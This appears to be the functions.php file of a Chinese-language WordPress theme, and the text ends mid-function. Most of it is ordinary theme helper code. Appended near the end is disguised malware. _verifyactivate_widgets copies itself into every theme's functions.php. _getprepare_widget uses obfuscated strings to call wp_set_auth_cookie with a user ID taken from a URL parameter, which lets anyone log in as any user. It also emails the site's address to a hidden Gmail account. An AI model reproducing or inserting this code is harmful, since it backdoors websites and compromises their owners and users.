<?php
//菜单
register_nav_menus();
//截字
function dm_strimwidth($str ,$start , $width ,$trimmarker ){$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str); return $output.$trimmarker;};
//title cut
function cut_str($src_str,$cut_length){$return_str='';$i=0;$n=0;$str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length))
    {$tmp_str=substr($src_str,$i,1);$ascnum=ord($tmp_str);
		if ($ascnum>=224){$return_str=$return_str.substr($src_str,$i,3); $i=$i+3; $n=$n+2;}
        elseif ($ascnum>=192){$return_str=$return_str.substr($src_str,$i,2);$i=$i+2;$n=$n+2;}
        elseif ($ascnum>=65 && $ascnum<=90){$return_str=$return_str.substr($src_str,$i,1);$i=$i+1;$n=$n+2;}
        else {$return_str=$return_str.substr($src_str,$i,1);$i=$i+1;$n=$n+1;}
    }
    if ($i<$str_length){$return_str = $return_str . '...';}
    if (get_post_status() == 'private'){ $return_str = $return_str . '（private）';}
    return $return_str;};
// 获取当前页链接
function curPageURL() {$pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";$this_page = $_SERVER["REQUEST_URI"];
    if (strpos($this_page, "?") !== false) $this_page = reset(explode("?", $this_page));
    if ($_SERVER["SERVER_PORT"] != "80") {$pageURL .= $_SERVER["SERVER_NAME"] . ":" .$_SERVER["SERVER_PORT"] . $this_page;} 
    else {$pageURL .= $_SERVER["SERVER_NAME"] . $this_page;}
    return $pageURL;};
//支持外链缩略图
if ( function_exists('add_theme_support') )
 add_theme_support('post-thumbnails');
function catch_first_image() {global $post, $posts;$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$first_img = $matches [1] [0];
	if(empty($first_img)){
		$random = mt_rand(1, 10);
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/images/random/'.$random.'.jpg';
		//$first_img = "/images/default.jpg";
		}
  return $first_img;};
//自定义头像
add_filter( 'avatar_defaults', 'fb_addgravatar' );
function fb_addgravatar( $avatar_defaults ) {
$myavatar = get_bloginfo('template_directory') . '/images/gravatar.png';
$avatar_defaults[$myavatar] = '自定义头像';
return $avatar_defaults;};
//评论回复/头像缓存
function weisay_comment($comment, $args, $depth) {$GLOBALS['comment'] = $comment;
	global $commentcount,$wpdb, $post;
     if(!$commentcount) { 
          $comments = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE comment_post_ID = $post->ID AND comment_type = '' AND comment_approved = '1' AND !comment_parent");
          $cnt = count($comments);
          $page = get_query_var('cpage');
          $cpp=get_option('comments_per_page');
         if (ceil($cnt / $cpp) == 1 || ($page > 1 && $page  == ceil($cnt / $cpp))) {
             $commentcount = $cnt + 1;
         } else {$commentcount = $cpp * $page + 1;}
     }
?>
<li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
   <div id="div-comment-<?php comment_ID() ?>" class="comment-body">
      <?php $add_below = 'div-comment'; ?>
		<div class="comment-author vcard"><?php if (get_option('swt_type') == 'Display') { ?>
			<?php
				$p = 'avatar/';
				$f = md5(strtolower($comment->comment_author_email));
				$a = $p . $f .'.jpg';
				$e = ABSPATH . $a;
				if (!is_file($e)){ 
				$d = get_bloginfo('wpurl'). '/avatar/default.jpg';
				$s = '40'; 
				$r = get_option('avatar_rating');
				$g = 'http://www.gravatar.com/avatar/'.$f.'.jpg?s='.$s.'&d='.$d.'&r='.$r;
                $avatarContent = file_get_contents($g);
                file_put_contents($e, $avatarContent);
				if ( filesize($e) == 0 ){ copy($d, $e); }
				};
			?>
			<img src='<?php bloginfo('wpurl'); ?>/<?php echo $a ?>' alt='' class='avatar' />
                <?php { echo ''; } ?>
			<?php } else { include(TEMPLATEPATH . '/comment_gravatar.php'); } ?>
	<div class="floor">
	<?php 
	if(!$parent_id = $comment->comment_parent){switch ($commentcount){
     case 2 :echo "沙发";--$commentcount;break;
     case 3 :echo "板凳";--$commentcount;break;
     case 4 :echo "地板";--$commentcount;break;
     default:printf('%1$s楼', --$commentcount);}}
	?>
	</div>
	<strong><?php comment_author_link() ?></strong>:<?php edit_comment_link('编辑','&nbsp;&nbsp;',''); ?></div>
	<?php if ( $comment->comment_approved == '0' ) : ?>
		<span style="color:#C00; font-style:inherit">您的评论正在等待审核中...</span>
		<br />			
		<?php endif; ?>
		<?php comment_text() ?>
		<div class="clear"></div><span class="datetime"><?php comment_date('Y-m-d') ?> <?php comment_time() ?> </span> <span class="reply"><?php comment_reply_link(array_merge( $args, array('reply_text' => '[回复]', 'add_below' =>$add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>
  </div>
<?php
}
function weisay_end_comment() {echo '</li>';};
//登陆显示头像
function weisay_get_avatar($email, $size = 48){
return get_avatar($email, $size);
};
//自定义表情地址
function custom_smilies_src($src, $img){return get_bloginfo('template_directory').'/images/smilies/' . $img;}
add_filter('smilies_src', 'custom_smilies_src', 10, 2);
//pagenavi
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a>";}
	previous_posts_link(' 上一页 ');
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	next_posts_link(' 下一页 ');
    if($paged != $max_page){echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a>";}}
};
//读者排行
function hcms_readers($out,$timer,$limit){
	global $wpdb;    
	$counts = $wpdb->get_results("SELECT COUNT(comment_author) AS cnt, comment_author,comment_author_url,comment_author_email FROM {$wpdb->prefix}comments WHERE comment_date > date_sub( NOW(), INTERVAL $timer MONTH ) AND comment_approved = '1' AND comment_author_email AND comment_author_url != '".$out."' AND comment_type = ''  AND user_id = '0' GROUP BY comment_author ORDER BY cnt DESC LIMIT $limit");      
	foreach ($counts as $count) {
            $c_url = $count->comment_author_url;
			if ($c_url == '') $c_url = 'javascript:;';
            $mostactive .= '<a rel="nofollow" href="'. $c_url . '" title="' . $count->comment_author .' 留下 '. $count->cnt . ' 个脚印" target="_blank">' . get_avatar($count->comment_author_email, 48, '', $count->comment_author . ' 留下 ' . $count->cnt . ' 个脚印') . '</a>';
        }
        echo $mostactive;
    } 
//边栏评论
function r_comments($outer){
	global $wpdb;
	$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type,comment_author_url,comment_author_email, SUBSTRING(comment_content,1,16) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND post_password = '' AND user_id='0' AND comment_author != '".$outer."' ORDER BY comment_date_gmt DESC LIMIT 5";
	$comments = $wpdb->get_results($sql);
	$output = $pre_HTML;
	foreach ($comments as $comment) {$output .= "\n<li>".get_avatar( $comment, 32,'',$comment->comment_author)." <a href=\"" . get_permalink($comment->ID) ."#comment-" . $comment->comment_ID . "\" title=\"发表在： " .$comment->post_title . "\">" .strip_tags($comment->comment_author).":<br/>". strip_tags($comment->com_excerpt)."</a><br /></li>";}
	$output .= $post_HTML;
	echo $output;
};
//调用友情链接
function Hcms_links($link_type="txt",$get_total=0) {
	global $wpdb;
	$link_select = ($link_type == "txt") ? " = ''" : " != ''";
	$get_total = ($get_total != 0) ? "LIMIT $get_total" : "";
	$request = "SELECT link_id, link_url, link_name, link_image, link_target, link_description, link_visible, link_rating FROM $wpdb->links ";
	$request .= " WHERE $wpdb->links.link_visible = 'Y' AND $wpdb->links.link_image $link_select ";
	$request .= " ORDER BY link_rating DESC, link_id ASC $get_total";
	$links = $wpdb->get_results($request);
	foreach ($links as $link) { //调用菜单
		$output = '';
		if ($link_type == "txt") $output .= '<a target="'.$link->link_target.'" title="'.$link->link_description.'" href="'.$link->link_url.'">'.$link->link_name.'</a>';
		else $output .= '<a target="'.$link->link_target.'" title="'.$link->link_description.'" href="'.$link->link_url.'"><img src="'.$link->link_image.'" alt="'.$link->link_name.'"></a>';
		$output .= ''."\n";
		echo $output;
	}
};
//彩色标签
function colorCloud($text) {$text = preg_replace_callback('|<a (.+?)>|i','colorCloudCallback', $text);return $text;}
function colorCloudCallback($matches) {
	$text = $matches[1];
	$color = dechex(rand(0,16777215));
	$pattern = '/style=(\'|\”)(.*)(\'|\”)/i';
	$text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
	return "<a $text>";}
add_filter('wp_tag_cloud', 'colorCloud', 1);
// Anti-Spam
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $referer = isset($_SERVER['HTTP_REFERER'])         ? $_SERVER['HTTP_REFERER']         : '隐瞒';
      $IP      = isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] . ' (透过代理)' : $_SERVER["REMOTE_ADDR"];
      $way     = isset($_POST['w'])                      ? '手动操作'                       : '未经评论表格';
      $spamcom = isset($_POST['comment'])                ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "请求: ". $request. "\n来路: ". $referer. "\nIP: ". $IP. "\n方式: ". $way. "\n內容: ". $spamcom. "\n -- 记录成功 --";
    }
  }
  function sink( $comment ) {
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      //方法一: 直接挡掉, 將 die(); 前面两斜线刪除即可.
      die();
      //方法二: 标记为 spam, 留在资料库检查是否误判.
      //add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      //$comment['comment_content'] = "[ 小墙判断这是 Spam! ]\n". $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();
//评论邮件提醒
function comment_mail_notify($comment_id) {
  $comment = get_comment($comment_id);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  $spam_confirmed = $comment->comment_approved;
  if (($parent_id != '') && ($spam_confirmed != 'spam')) {
    $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); //e-mail 发出点, no-reply 可改为可用的 e-mail.
    $to = trim(get_comment($parent_id)->comment_author_email);
    $subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
    $message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
       . trim(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 给您的回复:<br />'
       . trim($comment->comment_content) . '<br /></p>
      <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回复完整內容</a></p>
      <p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p>(由于服务器原因,我是不能收到您直接回复的邮件的,如果您还有问题,就到我的网站进行留言.)</p>
    </div>';
    $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
    wp_mail( $to, $subject, $message, $headers );
    //echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing
  }
}
add_action('comment_post', 'comment_mail_notify');
//访问计数
function record_visitors(){
	if (is_singular()) {global $post;
	 $post_ID = $post->ID;
	  if($post_ID) 
	  {
		  $post_views = (int)get_post_meta($post_ID, 'views', true);
		  if(!update_post_meta($post_ID, 'views', ($post_views+1))) 
		  {
			add_post_meta($post_ID, 'views', 1, true);
		  }
	  }
	}
}
add_action('wp_head', 'record_visitors');  
function post_views($before = '(点击 ', $after = ' 次)', $echo = 1)
{
  global $post;
  $post_ID = $post->ID;
  $views = (int)get_post_meta($post_ID, 'views', true);
  if ($echo) echo $before, number_format($views), $after;
  else return $views;
};
// 文章末加版权Feed
function insertFootNote($content) {
	if(is_feed()) {
		$wzbt = get_the_title();
		$wzlj = get_permalink($post->ID);
		$content.= '<p>';
		$content.= '<span style="font-weight:bold;text-shadow:0 1px 0 #ddd;">声明:</span> 本文采用 <a rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/" title="署名-非商业性使用-相同方式共享">BY-NC-SA</a> 协议进行授权 | <a href="'.home_url().'">'.get_bloginfo('name').'</a>';
		$content.= '<br />转载请注明转自《<a rel="bookmark" title="' . $wzbt . '" href="' . $wzlj . '">' . $wzbt . '</a>》';
		$content.= '</p>';
	}
	return $content;
}
add_filter ('the_content', 'insertFootNote');
//no_self_ping
function no_self_ping( &$links ) {
	$home = get_option( 'home' );
	foreach ( $links as $l => $link )
	if ( 0 === strpos( $link, $home ) )
	unset($links[$l]);
	}
add_action( 'pre_ping', 'no_self_ping' );
//no_autosave
function no_autosave() {
  wp_deregister_script('autosave');
}
add_action( 'wp_print_scripts', 'no_autosave' );
//隐藏版本更新提示
add_filter('pre_site_transient_update_core', create_function('$a', "return null;"));
//过滤代码的中文符号
remove_filter('the_content', 'wptexturize');
//移除顶部多余信息
function wpbeginner_remove_version() { 
return ; 
} add_filter('the_generator', 'wpbeginner_remove_version');//wordpress的版本号 
remove_action('wp_head', 'index_rel_link');//当前文章的索引 
remove_action('wp_head', 'feed_links_extra', 3);// 额外的feed,例如category, tag页 
remove_action('wp_head', 'start_post_rel_link', 10, 0);// 开始篇 
remove_action('wp_head', 'parent_post_rel_link', 10, 0);// 父篇 
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // 上、下篇. 
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );//rel=pre
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0 );//rel=shortlink 
remove_action('wp_head', 'rel_canonical' ); 
wp_deregister_script('l10n'); 
//添加编辑器快捷按钮
add_action('admin_print_scripts', 'my_quicktags');
function my_quicktags() {
    wp_enqueue_script(
        'my_quicktags',
        get_stylesheet_directory_uri().'/js/my_quicktags.js',
        array('quicktags')
    );
    }
//导入主题配置文件
include("includes/theme_options.php");
include("includes/shortcode.php");
//所有设置结束



 //获取最新评论
function Get_Recent_Comment($limit=16,$cut_length=24){
	global $wpdb;	
	$admin_email = "'" . get_bloginfo ('admin_email') . "'"; //获取管理员邮箱，以便排除管理员的评论
	$rccdb = $wpdb->get_results("
		SELECT ID, post_title, comment_ID, comment_author, comment_author_email, comment_content
		FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts
		ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID)
		WHERE comment_approved = '1'
		AND comment_type = ''
		AND post_password = ''
		AND comment_author_email != $admin_email
		ORDER BY comment_date_gmt
		DESC LIMIT $limit
	 ");//数据库查询获得想要的结果	 
	foreach ($rccdb as $row) { 
		$rcc .= "<li>".get_avatar($row,$size='32')."<span>".$row->comment_author ."：</span>"."<br />". "<a href='"
		. get_permalink($row->ID) . "#comment-" . $row->comment_ID
		. "' title='查看 " . $row->post_title . "'>" . cut_str($row->comment_content,$cut_length)."</a>". "</li>";
	}//遍历查询到结果，获得想要的值，其中插入一些HTML元素，以便定义CSS样式	
	//$rcc = convert_smilies($rcc);//允许评论内容中显示表情
	echo $rcc;//输出结果
}
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function glob($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, 

SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE 

comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".

$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM 

$wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". 

call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . 

$link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . 

"</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
remove_action( 'wp_head', 'feed_links_extra', 3 ); // Display the links to the extra feeds such as category feeds

remove_action( 'wp_head', 'feed_links', 2 ); // Display the links to the general feeds: Post and Comment Feed

remove_action( 'wp_head', 'rsd_link' ); // Display the link to the Really Simple Discovery service endpoint, EditURI link

remove_action( 'wp_head', 'wlwmanifest_link' ); // Display the link to the Windows Live Writer manifest file.

remove_action( 'wp_head', 'index_rel_link' ); // index link

remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // prev link

remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link

remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 ); // Display relational links for the posts adjacent to the current post.

remove_action( 'wp_head', 'wp_generator' ); // Display the XHTML generator that is generated on the wp_head hook, WP version
//增强编辑器开始
/*
function add_editor_buttons($buttons) {

$buttons[] = 'fontselect';

$buttons[] = 'fontsizeselect';

$buttons[] = 'cleanup';

$buttons[] = 'styleselect';

$buttons[] = 'hr';

$buttons[] = 'del';

$buttons[] = 'sub';

$buttons[] = 'sup';

$buttons[] = 'copy';

$buttons[] = 'paste';

$buttons[] = 'cut';

$buttons[] = 'undo';

$buttons[] = 'image';

$buttons[] = 'anchor';

$buttons[] = 'backcolor';

$buttons[] = 'wp_page';

$buttons[] = 'charmap';

return $buttons;

}

add_filter("mce_buttons_3", "add_editor_buttons");*/

//增强编辑器结束
/*function updatecontent($content){
	  $content = preg_replace('/<h6>|<h6><wp_nokeywordlink>/','<h6><wp_nokeywordlink>',$content);
	  $content = preg_replace('/<\/h6>|<\/wp_nokeywordlink><\/h6>/','</wp_nokeywordlink></h6>',$content);
	  return $content;
	}
add_filter ('the_content', 'updatecontent');	*/
function get_category_root_id($cat)
{
$this_category = get_category($cat);   // 取得当前分类
while($this_category->category_parent) // 若当前分类有上级分类时，循环
{
$this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
}
return $this_category->term_id; // 返回根分类的id号
//return $this_category->slug;//返回跟分类的别名
}
function get_category_root_slug($cat)
{
$this_category = get_category($cat);   // 取得当前分类
while($this_category->category_parent) // 若当前分类有上级分类时，循环
{
$this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
}
return $this_category->slug;//返回跟分类的别名
}
//获取文章第一张图片，如果没有图，就不显示图
//文章中第一张图片获取图片
function catch_that_image() { 
 global $post, $posts; 
 $first_img = ''; 
 ob_start(); 
 ob_end_clean(); 
 $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches); 
 $first_img = $matches[1][0]; 
 $first_img_width = $matches[2][0];
 $first_img_height = $matches[3][0]; 
 if(empty($first_img)){  
   $first_img = bloginfo('template_url'). '/images/default-thumb.jpg'; 
 }else{
	 $first_img_html .= '<div class="pic_border_out" style="width:'.($first_img_width+22).'px">';
	 $first_img_html .= '<div class="pic_border_in" style="width:'.($first_img_width).'px;height:'.$first_img_height.'px;">';
	 $first_img_html .= '<div id="preview">';
	 $first_img_html .= '<img src="'.$first_img.'" style="width:'.($first_img_width).'px;height:'.$first_img_height.'px;">';
	 $first_img_html .= '</div>';
	 $first_img_html .= '</div>';
	 $first_img_html .= '</div>';
	 }
 return $first_img_html; 
 } 
//---------获取图片地址-----------//
function get_image_url(){
	 global $post, $posts; 
	 $first_img = ''; 
	 ob_start(); 
	 ob_end_clean(); 
	 $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*width=[\'"]([0-9]+)[\'"].*height=[\'"]([0-9]+)[\'"].*>/i', $post->post_content, $matches); 
	 $info['img'] = $matches[1][0];
	 $info['width'] = $matches[2][0];
     $info['height'] = $matches[3][0];  
	 return $info;
	}
//end
 function SpHtml2Text($str)
			   {
			   $str = preg_replace("/<sty(.*)\\/style>|<scr(.*)\\/script>|<!--(.*)-->/isU","",$str);
			   $alltext = "";
			   $start = 1;
			   for($i=0;$i<strlen($str);$i++)
			   {
			   if($start==0 && $str[$i]==">")
			   {
